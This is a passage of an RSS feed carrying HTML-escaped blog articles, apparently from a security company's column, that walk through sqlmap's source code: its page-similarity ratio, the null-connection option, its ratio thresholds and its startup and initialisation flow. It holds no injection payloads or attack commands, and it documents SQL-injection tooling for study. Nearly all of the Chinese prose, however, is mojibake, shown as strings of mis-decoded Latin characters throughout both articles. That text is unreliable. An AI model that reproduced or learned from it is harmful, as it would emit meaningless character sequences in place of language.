class=&quot;inline&quot;&gt;PageRatio&lt;/code&gt; çš„é¡µé¢ç›¸ä¼¼åº¦ç®—æ³•ï¼Œè€Œæ˜¯å› ä¸ºç”¨æˆ·è®¾å®šäº† &lt;code class=&quot;inline&quot;&gt;--string/--not-string/--regex/--code&lt;/code&gt; ä»è€Œå¯ä»¥æ˜ç¡®ä»å…¶ä»–æ–¹é¢åŒºåˆ†å‡ºé¡µé¢ä¸ºä»€ä¹ˆä¸åŒã€‚å½“ç„¶ï¼Œæˆ‘ä»¬çš„é‡ç‚¹å¹¶ä¸æ˜¯ä»–ï¼Œè€Œæ˜¯è®¡ç®— &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; å¹¶ä¸”ä½¿ç”¨ &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; å¾—å‡ºé¡µé¢ç›¸ä¼¼çš„å…·ä½“é€»è¾‘ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9d3093ad48167b9ec3f755d23f26b274_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;822&quot; data-rawheight=&quot;487&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9d3093ad48167b9ec3f755d23f26b274&quot; data-watermark-src=&quot;v2-27af2f2d71d73d24571e676a27ea0074&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;æˆ‘ç›¸ä¿¡ä»¤å¤§å®¶å›°æƒ‘çš„å¯èƒ½æ˜¯è¿™ä¸¤æ®µå…³äº &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; çš„ä»£ç ï¼Œåœ¨å‰é¢çš„éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬æ²¡æœ‰è¯¦ç»†è¯´æ˜ &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; ç©¶ç«Ÿæ„å‘³ç€ä»€ä¹ˆï¼š&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;
  Optimization:
    These options can be used to optimize the performance of sqlmap
â€‹
    -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)&lt;/code&gt;&lt;p&gt;æ ¹æ®å®˜æ–¹æ‰‹å†Œçš„æè¿°ï¼Œ&lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; æ˜¯ä¸€ç§ä¸ç”¨è·å–é¡µé¢å†…å®¹å°±å¯ä»¥çŸ¥é“é¡µé¢å¤§å°çš„æ–¹æ³•ï¼Œè¿™ç§æ–¹æ³•åœ¨å¸ƒå°”ç›²æ³¨ä¸­æœ‰éå¸¸å¥½çš„æ•ˆæœï¼Œå¯ä»¥å¾ˆå¥½çš„èŠ‚çœå¸¦å®½ã€‚å…·ä½“çš„åŸç†è¯¦è§&lt;a href=&quot;http://www.wisec.it/sectou.php?id=472f952d79293&quot;&gt;è¿™ä¸€ç‰‡å¤è€çš„æ–‡ç« &lt;/a&gt;ã€‚&lt;/p&gt;&lt;p&gt;æ˜ç™½è¿™ä¸€ç‚¹ï¼Œä¸Šé¢çš„ä»£ç å°±å˜å¾—å¼‚å¸¸å¥½æ‡‚äº†ï¼Œå¦‚æœæ²¡æœ‰å¯ç”¨ &lt;code class=&quot;inline&quot;&gt;--null-connection&lt;/code&gt; ä¼˜åŒ–ï¼Œä¸¤æ¬¡æ¯”è¾ƒçš„é¡µé¢åˆ†åˆ«ä¸º &lt;code class=&quot;inline&quot;&gt;page&lt;/code&gt; ä¸ &lt;code class=&quot;inline&quot;&gt;kb.pageTemplate&lt;/code&gt;ã€‚å…¶å® &lt;code class=&quot;inline&quot;&gt;kb.pageTemplate&lt;/code&gt; ä¹Ÿå¹¶ä¸é™Œç”Ÿï¼Œå…¶å®å°±æ˜¯ç¬¬ä¸€æ¬¡æ­£å¼è®¿é—®é¡µé¢çš„æ—¶å€™ï¼Œå­˜ä¸‹çš„é‚£ä¸ªé¡µé¢çš„å†…å®¹ã€‚&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
conf.originalPage = kb.pageTemplate = page&lt;/code&gt;&lt;p&gt;å¦‚æœå¯ç”¨ &lt;code class=&quot;inline&quot;&gt;--null-connection&lt;/code&gt;ï¼Œè®¡ç®— ratio å°±åªæ˜¯å¾ˆç®€å•çš„é€šè¿‡é¡µé¢çš„é•¿åº¦æ¥è®¡ç®—ï¼Œè®¡ç®—å…¬å¼ä¸º &lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
ratio = 1. * pageLength / len(kv.pageTemplate)
â€‹
if ratio &amp;gt; 1.:
    ratio = 1. / ratio&lt;/code&gt;&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬å†é¡ºç€ä»–çš„é€»è¾‘å¾€ä¸‹èµ°ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-fe348699c782f91fd21c2a65027dccb9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1332&quot; data-rawheight=&quot;650&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-fe348699c782f91fd21c2a65027dccb9&quot; data-watermark-src=&quot;v2-c5ec57535b9e20fd12d85af9c4971566&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ ¹æ®ä¸Šé¢å¯¹æºç çš„æ ‡æ³¨ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“ç†è§£è¿™ä¸ª &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; æ˜¯æ€ä¹ˆç®—å‡ºæ¥çš„ï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå¾ˆæ¸…æ¥šï¼Œå…¶å®å¹¶ä¸åªæ˜¯ç®€å•æ— è„‘çš„ä½¿ç”¨ &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; å°±å¯ä»¥èµ·åˆ°å¾ˆå¥½çš„æ•ˆæœï¼Œé…åˆå„ç§å„æ ·çš„é€‰é¡¹æˆ–è€…é¢„å¤„ç†ï¼šæ¯”å¦‚ç§»é™¤é¡µé¢çš„åŠ¨æ€å†…å®¹ï¼Œåªæ¯”è¾ƒ &lt;code class=&quot;inline&quot;&gt;title&lt;/code&gt;ï¼Œåªæ¯”è¾ƒæ–‡æœ¬ï¼Œä¸æ¯”è¾ƒ &lt;code class=&quot;inline&quot;&gt;html&lt;/code&gt; æ ‡ç­¾ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8cb294971e4a5551406807509e464c70_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1182&quot; data-rawheight=&quot;491&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8cb294971e4a5551406807509e464c70&quot; data-watermark-src=&quot;v2-8f38bc19f35863fd650048845660cbf7&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ä¸Šé¢æºç ä¸ºæœ€ç»ˆä½¿ç”¨ &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; å¯¹é¡µé¢çš„ç›¸ä¼¼åº¦ä½œå‡ºåˆ¤æ–­çš„é€»è¾‘ï¼Œå…¶ä¸­&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
UPPER_RATIO_BOUND = 0.98
LOWER_RATIO_BOUND = 0.02
DIFF_TOLERANCE = 0.05&lt;/code&gt;&lt;h2&gt;&lt;b&gt;0x05 ç»“æŸè¯­&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;é˜…è¯»å®Œæœ¬æ–‡ï¼Œæˆ‘ç›¸ä¿¡è¯»è€…å¯¹ sqlmap ä¸­å¤„ç†å„ç§é—®é¢˜çš„ç»†èŠ‚éƒ½ä¼šæœ‰è‡ªå·±çš„ç†è§£ï¼Œå½“ç„¶è¿™æ˜¯æœ€å¥½çš„ã€‚&lt;/p&gt;&lt;p&gt;åœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ï¼Œç¬”è€…å°†ä¼šå¸¦å¤§å®¶è¿›å…¥æ›´æ·±å±‚çš„ sqlmap çš„é€»è¾‘ï¼Œæ•¬è¯·æœŸå¾…ã€‚&lt;/p&gt;</description>
<author>å°è˜‘è‡</author>
<guid isPermaLink="false">2018-09-10-44157153</guid>
<pubDate>Mon, 10 Sep 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>sqlmap å†…æ ¸åˆ†æ I: åŸºç¡€æµç¨‹</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-08-29-43242220.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/43242220&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0de9ae59e29655770ea5df5a2aa92776_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;ä½œè€…ï¼š &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hash=&quot;af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hovercard=&quot;p$b$af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;å®‰å…¨ç ”å‘å·¥ç¨‹å¸ˆï¼Œç°å°±èŒäºé•¿äº­ç§‘æŠ€ï¼Œå–œæ¬¢å–µå–µ&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ä¸€ç›´åœ¨æƒ³å‡†å¤‡ä¸€ç³»åˆ— sqlmap çš„æ–‡ç« ï¼Œæ‹…å¿ƒä¼šä¸ä¼šå› ä¸ºå¤ªè€å¤ªæ—§äº†è¢«å¤§å®¶åæ§½ï¼Œæ€å‰æƒ³åä¹ŸæŸ¥äº†ä¸€äº›ç°æœ‰çš„èµ„æ–™ï¼Œè¿˜æ˜¯å‡†å¤‡å‡ºä¸€éƒ¨åˆ†å…³äº sqlmap å…³é”®æŠ€æœ¯ç»†èŠ‚çš„æ¢è®¨ã€‚åŒæ—¶ä¹Ÿåœ¨å¯¹å…¶æ ¸å¿ƒçš„è®¨è®ºä¸­ï¼Œæç‚¼å‡ºä¸€äº›æ€æƒ³ä¸æ–¹æ³•ã€‚sqlmap å†…æ ¸åˆ†æç³»åˆ—æ–‡ç« å…±ä¸‰ç¯‡ï¼Œæœ¬æ–‡ä¸ºç¬¬ä¸€ç¯‡ï¼Œæ•¬è¯·æŒ‡æ­£ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æˆ‘ç›¸ä¿¡åœ¨é˜…è¯»æœ¬æ–‡çš„è¯»è€…ä¸­ï¼Œå¾ˆå¤§ä¸€éƒ¨åˆ†äººéƒ½æ˜¯æ›¾ç»å°è¯•é˜…è¯»è¿‡ sqlmap æºç çš„åŒå­¦ã€‚ä½†æ˜¯åœ¨å®é™…é˜…è¯»çš„æ—¶å€™ï¼Œæˆ‘ä»¬å‘ç°å¤§å®¶æ€»æ˜¯å­˜åœ¨å„ç§å„æ ·å¥‡è‘©çš„å›°éš¾ä¸å›°æƒ‘ã€‚&lt;/p&gt;&lt;blockquote&gt;â€œSqlMap æºç ä¸ºä»€ä¹ˆä¼šæœ‰å¤§å‡ ç™¾è¡Œä¸€åƒè¡Œçš„æ–¹æ³•å•Šâ€â€œå®ƒé‡Œé¢ conf å’Œ kb åˆæ˜¯å•¥ï¼Ÿè¿™ä¸¤ä¸ªå…¨å±€å˜é‡é‡Œé¢åˆ°åº•å­˜äº†å•¥ï¼Ÿâ€â€œä¸ºä»€ä¹ˆæˆ‘ç›´æ¥æŠŠ sqlmap çš„ xml å–å‡ºæ¥ï¼Œè¿˜æ˜¯å¹¶ä¸æ˜¯ç‰¹åˆ«æ–¹ä¾¿ä½¿ç”¨ä»–ä»¬çš„ payloadâ€&lt;/blockquote&gt;&lt;p&gt;æˆ‘ç›¸ä¿¡è¿™äº›ç–‘é—®å¤§å®¶è‚¯å®šç¬¬ä¸€æ¬¡åœ¨é˜…è¯»è¿™ä¸ªé¡¹ç›®çš„äº‹ï¼Œéƒ½ä¼šé‡åˆ°ã€‚å®é™…ä¸Šï¼Œå¹¶ä¸æ˜¯å› ä¸º sqlmap é¡¹ç›®çš„æ°´å¹³é«˜å¯¼è‡´å¤§å®¶çœ‹ä¸æ‡‚ã€‚è€Œæ˜¯ç”±äºé¡¹ç›®èƒŒè´Ÿäº†å¤ªå¤šçš„å†å²åŒ…è¢±ï¼Œå¯¼è‡´åœ¨æ¥è¿‘åå¹´çš„å‘å±•ä¸­ï¼Œå¼€å‘è€…ä¸åæœŸç»´æŠ¤è€…å¹¶æ²¡æœ‰å¯¹è¿™æ¬¾å·¥å…·è¿›è¡Œé‡æ„ä¸å¤§è§„æ¨¡é‡å†™ï¼Œåè€Œæ˜¯ç»§ç»­ä½¿ç”¨ python2 å¯¹å…¶ç¼ç¼è¡¥è¡¥ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-712750c7108b641649d3721495a5f40d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;764&quot; data-rawheight=&quot;284&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-712750c7108b641649d3721495a5f40d&quot; data-watermark-src=&quot;v2-5c07344e99ff5c13b56bbce7afeb8127&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;åœ¨æœ¬ç³»åˆ—æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦é’ˆå¯¹ sqlmap çš„æœ€æ ¸å¿ƒçš„æ–¹æ–¹é¢é¢è¿›è¡Œåˆ†æï¼Œæœ¬æ–‡ä¸»è¦é’ˆå¯¹åŸºç¡€æµç¨‹è¿›è¡Œä»‹ç»ä¸æè¿°ï¼Œæœ¬æ–‡ç”±éå¸¸ç»†è‡´çš„ sqlmap æºç è§£è¯»ï¼Œå¸Œæœ›æœ‰éœ€è¦çš„è¯»è€…å¯ä»¥ä»ä¸­å—ç›Šã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 å‡†å¤‡å·¥ä½œ&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æƒ³è¦é˜…è¯» sqlmap æºç æˆ‘ç›¸ä¿¡å¤§å®¶çš„é€‰æ‹©è‚¯å®šæ›´å¤šçš„æ˜¯ä» github ä¸‹ç›´æ¥ clone ä»£ç åˆ°æœ¬åœ°ï¼Œç›´æ¥ä½¿ç”¨æœ¬åœ°ç¼–è¾‘å™¨æˆ–è€… IDE æ‰“å¼€ç›´æ¥æ¥åˆ†æã€‚æ‰€ä»¥åŸºæœ¬æ“ä½œä¹Ÿå°±æ˜¯&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap&lt;/code&gt;&lt;p&gt;è¿›å…¥ sqlmap çš„ repos ä¸‹ï¼Œç›´æ¥æ‰“å¼€ç¼–è¾‘å™¨å§ï¼&lt;/p&gt;&lt;p&gt;å½“ç„¶å¾ˆå¤šè¯»è€…æ˜¯ Python3 ç”¨æˆ·ï¼Œå…¶å®ä¹Ÿæ²¡æœ‰å¿…è¦è´¹å¾ˆå¤§åŠ›æ°”åœ¨æœ¬æœºä¸Šå®‰è£… Python2 ç„¶åå†è¿›è¡Œæ“ä½œã€‚ç¬”è€…ä½¿ç”¨çš„ç¯å¢ƒæ˜¯&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Mac OS X&lt;/li&gt;&lt;li&gt;Pyenv&lt;/li&gt;&lt;li&gt;VSCode&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;æ¨èä½¿ç”¨ Pyenvï¼ˆ+virtualenvï¼‰ æ„å»º Python ç¯å¢ƒè¿è¡Œ sqlmapã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 åˆå§‹åŒ–ä¸åº•å±‚å»ºç­‘&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;ç¬”è€…å½“ç„¶å¯ä»¥ç›´æ¥æŒ‡å‡ºæ‰€æœ‰çš„é‡è¦é€»è¾‘åœ¨ä»€ä¹ˆä½ç½®ï¼Œä½†æ˜¯è¿™æ ·å¹¶ä¸å¥½ã€‚è¿™æ ·åšçš„åæœå°±æ˜¯å¤§å®¶å‘å‡ºå¥‡æ€ªçš„ç–‘é—®ï¼š&lt;/p&gt;&lt;blockquote&gt;å®ƒé‡Œé¢ conf å’Œ kb åˆæ˜¯å•¥ï¼Ÿè¿™ä¸¤ä¸ªå…¨å±€å˜é‡é‡Œé¢åˆ°åº•å­˜äº†å•¥ï¼Ÿ&lt;/blockquote&gt;&lt;p&gt;é€æ­¥ç†Ÿæ‚‰æ•´ä¸ªé¡¹ç›®çš„æ„å»ºå’Œé¡¹ç›®ä¸­è´¯ç©¿å…¨å±€çš„ä¸¤ä¸ªå¥‡æ€ªçš„å…¨å±€å˜é‡ï¼Œå¯¹äºåŠ é€Ÿç†è§£ sqlmap çš„æ ¸å¿ƒé€»è¾‘èµ·äº†å¾ˆå¤§çš„ä½œç”¨ã€‚åœ¨ç¬”è€…çš„å·¥ä½œå’Œå®è·µä¸­ï¼Œç¡®å®æ˜¯å¾ˆæœ‰æ„Ÿè§¦ã€‚&lt;/p&gt;&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯ä»å¤´çœ‹èµ·å§ï¼&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7b344e94e680fa513e682a3b5d466940_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;824&quot; data-rawheight=&quot;666&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7b344e94e680fa513e682a3b5d466940&quot; data-watermark-src=&quot;v2-06d2ddbe5501502bd0c6bdda720a58cd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;æˆ‘ä»¬åœ¨ä¸Šå›¾ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°å¾ˆæ˜æ˜¾çš„ç¨‹åºå‘½ä»¤è¡Œå…¥å£ï¼Œæˆ‘ä»¬æš‚ä¸”åªåˆ†æå‘½ä»¤è¡Œå…¥å£æ‰€ä»¥ï¼Œæˆ‘æŠŠæ— å…³çš„ä¸œè¥¿å…¨éƒ¨æ‰“äº†é©¬èµ›å…‹ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹åˆ° &lt;code class=&quot;inline&quot;&gt;main&lt;/code&gt; å‡½æ•°ç›´æ¥æ¥äº†è§£ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-43bc8948a61b7ca01eeea2ab047428de_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;524&quot; data-rawheight=&quot;559&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-43bc8948a61b7ca01eeea2ab047428de&quot; data-watermark-src=&quot;v2-636cd5928be38325916564577292864e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;æˆ‘ç›¸ä¿¡å¤§å®¶çœ‹åˆ°äº†ä¸Šå›¾åº”è¯¥å°±çŸ¥é“æˆ‘ä»¬ä¸»è¦åº”è¯¥çœ‹ &lt;code class=&quot;inline&quot;&gt;try&lt;/code&gt; ä¸­çš„å†…å®¹ã€‚å®é™…ä¸Š &lt;code class=&quot;inline&quot;&gt;except&lt;/code&gt; ä¸­æŒ‡çš„æ˜¯ sqlmap ä¸­å„ç§å„æ ·å¼‚å¸¸å¤„ç†ï¼ŒåŒ…å«è®©ç¨‹åºé€€å‡ºè€Œé‡Šæ”¾çš„å¼‚å¸¸/ç”¨æˆ·å¼‚å¸¸ä»¥åŠå„ç§é¢„æœŸæˆ–éé¢„æœŸå¼‚å¸¸ï¼Œåœ¨ &lt;code class=&quot;inline&quot;&gt;finally&lt;/code&gt; ä¸­ï¼Œå¤§è‡´è¿›è¡Œäº†æ•°æ®åº“ï¼ˆHashDBï¼‰çš„æ£€æŸ¥/æ¢å¤/é‡Šæ”¾ä»¥åŠ &lt;code class=&quot;inline&quot;&gt;dumper&lt;/code&gt; çš„æ”¶å°¾æ“ä½œå’Œå¤šçº¿ç¨‹çš„èµ„æºå›æ”¶æ“ä½œã€‚å…·ä½“çš„ä¸é‡è¦çš„ä»£ç æˆ‘ä»¬å°±ä¸ç»§ç»­ä»‹ç»äº†ï¼Œæ¥ä¸‹æ¥ç›´æ¥æ¥äº†è§£æ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†å§ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-fc053c2c16c65ff3ee15f55a4158ec5d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;987&quot; data-rawheight=&quot;525&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-fc053c2c16c65ff3ee15f55a4158ec5d&quot; data-watermark-src=&quot;v2-15fe5125c6a3020e351f2dd5e72a1498&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;åœ¨å®é™…åœ¨å·¥ä½œéƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº† 1-4 å‡½æ•°å¯¹ç¯å¢ƒå’ŒåŸºç¡€é…ç½®è¿›è¡Œäº†ä¸€åŒæ“ä½œï¼Œç„¶ååœ¨ 5 æ­¥éª¤çš„æ—¶å€™è¿›è¡Œæ­¥éª¤åˆå§‹åŒ–ï¼Œç„¶åå¼€å§‹å¯åŠ¨ sqlmapã€‚å®é™…ä¸Šè¿™äº›æ“ä½œå¹¶ä¸æ˜¯ä¸€æ— æ˜¯å¤„ï¼Œæ¥ä¸‹æ¥æœ‰è¯¦æœ‰ç•¥ä»‹ç»è¿™äº›æ­¥éª¤ç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆã€‚&lt;/p&gt;&lt;ol&gt;&lt;li&gt;åœ¨ DirtyPatches ä¸­ï¼Œé¦–å…ˆè®¾å®šäº† httplib çš„æœ€å¤§è¡Œé•¿åº¦ï¼ˆ&lt;code class=&quot;inline&quot;&gt;httplib._MAXLINE&lt;/code&gt;ï¼‰ï¼Œæ¥ä¸‹æ¥å¯¼å…¥ç¬¬ä¸‰æ–¹çš„ windows ä¸‹çš„ ipåœ°å€è½¬æ¢å‡½æ•°æ¨¡å—ï¼ˆ&lt;code class=&quot;inline&quot;&gt;win_inet_pton&lt;/code&gt;ï¼‰ï¼Œç„¶åå¯¹ç¼–ç è¿›è¡Œäº†ä¸€äº›æ›¿æ¢ï¼ŒæŠŠ &lt;code class=&quot;inline&quot;&gt;cp65001&lt;/code&gt; æ›¿æ¢ä¸º &lt;code class=&quot;inline&quot;&gt;utf8&lt;/code&gt; é¿å…å‡ºç°ä¸€äº›äº¤äº’ä¸Šçš„é”™è¯¯ï¼Œè¿™äº›æ“ä½œå¯¹äº sqlmap çš„å®é™…åŠŸèƒ½å½±å“å¹¶ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œå±äºä¿è¯èµ·ç”¨æˆ·ä½“éªŒå’Œç³»ç»Ÿè®¾ç½®çš„æ­£å¸¸é€‰é¡¹ï¼Œä¸éœ€è¦è¿›è¡Œè¿‡å¤šå…³å¿ƒã€‚&lt;/li&gt;&lt;li&gt;åœ¨ç¯å¢ƒæ£€æŸ¥ä¸­ï¼Œåšäº†å¦‚ä¸‹æ“ä½œï¼šæ£€æŸ¥æ¨¡å—è·¯å¾„ï¼Œæ£€æŸ¥ Python ç‰ˆæœ¬ï¼Œå¯¼å…¥å…¨å±€å˜é‡ã€‚æˆ‘ä»¬å¯èƒ½å¹¶ä¸éœ€è¦å…³å¿ƒå¤ªå¤šè¿™ä¸€æ­¥ï¼Œåªéœ€è¦è®°å¾—åœ¨è¿™ä¸€æ­¥æˆ‘ä»¬å¯¼å…¥äº†å‡ ä¸ªå…³é”®çš„å…¨å±€å˜é‡ï¼š&lt;code class=&quot;inline&quot;&gt;(&quot;cmdLineOptions&quot;, &quot;conf&quot;, &quot;kb&quot;)&lt;/code&gt;ï¼Œéœ€è¦æé†’å¤§å®¶çš„æ˜¯ï¼Œç›´æ¥å» &lt;code class=&quot;inline&quot;&gt;lib.core.data&lt;/code&gt; ä¸­å¯»æ‰¾è¿™å‡ ä¸ªå˜é‡å¹¶ä¸æ˜¯æ˜æ™ºçš„é€‰æ‹©ï¼Œå› ä¸ºä»–ä»¬å¹¶ä¸æ˜¯åœ¨è¿™é‡Œåˆå§‹åŒ–çš„ï¼ˆè¯´ç™½äº†å°±æ˜¯æ‰¾åˆ°äº†å®šä¹‰ä¹Ÿæ²¡æœ‰ç”¨ï¼Œåªéœ€è¦çŸ¥é“æœ‰ä»–ä»¬å‡ ä¸ªå°±å¤Ÿå•¦ï¼‰ã€‚&lt;/li&gt;&lt;li&gt;åˆå§‹åŒ–å„ç§èµ„æºæ–‡ä»¶è·¯å¾„ã€‚&lt;/li&gt;&lt;li&gt;æ‰“å° Bannerã€‚&lt;/li&gt;&lt;li&gt;è¿™ä¸€éƒ¨åˆ†å¯ä»¥è¯´æ˜¯éå¸¸å…³é”®äº†ï¼Œè™½ç„¶è¡¨é¢ä¸Šä»ç„¶æ˜¯å±äºåˆå§‹åŒ–çš„é˜¶æ®µï¼Œä½†æ˜¯å®é™…ä¸Šï¼Œå¦‚æœä¸çŸ¥æ™“è¿™ä¸€æ­¥ï¼Œé¢å¯¹åé¢çš„ç›´æ¥å¯¹å…¨å±€å˜é‡ &lt;code class=&quot;inline&quot;&gt;kb&lt;/code&gt; å’Œ &lt;code class=&quot;inline&quot;&gt;conf&lt;/code&gt; çš„æ“ä½œå°†ä¼šå˜çš„éå¸¸å¥‡æ€ªå’Œé™Œç”Ÿã€‚åœ¨è¿™æ­¥ä¸­ï¼Œæˆ‘ä»¬è¿›è¡Œäº†é…ç½®æ–‡ä»¶åˆå§‹åŒ–ï¼ŒçŸ¥è¯†åº“ï¼ˆKnowledgeBaseåˆå§‹åŒ–ï¼‰ä»¥åŠç”¨æˆ·æ“ä½œçš„ &lt;code class=&quot;inline&quot;&gt;Merge&lt;/code&gt; å’Œåˆå§‹åŒ–ã€‚æˆ‘ä»¬åœ¨ä¹‹åçš„åˆ†æä¸­å¦‚æœé‡åˆ°äº†é’ˆå¯¹ &lt;code class=&quot;inline&quot;&gt;kb&lt;/code&gt; å’Œ &lt;code class=&quot;inline&quot;&gt;conf&lt;/code&gt; çš„æ“ä½œï¼Œå¯ä»¥ç›´æ¥åœ¨è¿™ä¸ªå‡½æ•°å¯¹åº”çš„ &lt;code class=&quot;inline&quot;&gt;lib.core.option&lt;/code&gt; æ¨¡å—ä¸­å¯»æ‰¾å¯¹åº”çš„åˆå§‹åŒ–å˜é‡çš„å®šä¹‰ã€‚å½“ç„¶ï¼Œè¿™ä¸€æ­¥æ¶‰åŠåˆ°çš„ä¸€äº› &lt;code class=&quot;inline&quot;&gt;kb/conf&lt;/code&gt; çš„ fields ä¹Ÿå¯èƒ½æ¥æºäº &lt;code class=&quot;inline&quot;&gt;lib.parse.cmdline&lt;/code&gt; ä¸­ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ &lt;code class=&quot;inline&quot;&gt;ctrl+F&lt;/code&gt; æœç´¢åˆ°ã€‚&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-81288766ac31da8e9e2f049c8a987b32_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1138&quot; data-rawheight=&quot;570&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-81288766ac31da8e9e2f049c8a987b32&quot; data-watermark-src=&quot;v2-9fa8331cd060a98fcc2d11ce9dab2e26&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;ol&gt;&lt;li&gt;ä¸­ä¸»è¦åŒ…å«æ‰€æœ‰åˆå§‹å˜é‡çš„åˆå§‹å€¼ï¼Œè¿™äº›åˆå§‹å€¼åœ¨ &lt;code class=&quot;inline&quot;&gt;init()&lt;/code&gt; çš„è®¾å®šä¸»è¦æ˜¯å¼•ç”¨å„ç§å„æ ·çš„å‡½æ•°æ¥å®ŒæˆåŸºç¡€è®¾ç½®ï¼Œæˆ‘ä»¬æ²¡æœ‰å¿…è¦ä¾æ¬¡å¯¹å…¶è¿›è¡Œåˆ†æ”¯ï¼Œåªéœ€è¦ç”¨åˆ°çš„æ—¶å€™çŸ¥é“å›æ¥å¯»æ‰¾å°±å¯ä»¥äº†ã€‚&lt;/li&gt;&lt;li&gt;å†’çƒŸæµ‹è¯•ï¼Œæµ‹è¯•ç¨‹åºæœ¬èº«æ˜¯å¦å¯ä»¥è·‘å¾—é€šã€‚&lt;/li&gt;&lt;li&gt;åŠŸèƒ½æµ‹è¯•ï¼Œæµ‹è¯• sqlmap åŠŸèƒ½æ˜¯å¦å®Œæ•´ã€‚&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;è¿›å…¥ä¸Šä¸€æ®µä»£ç çš„æ¡ä»¶æ˜¯ &lt;code class=&quot;inline&quot;&gt;if not conf.updateAll&lt;/code&gt;ï¼Œè¿™ä¸ªæ˜¯æ¥æºäº &lt;code 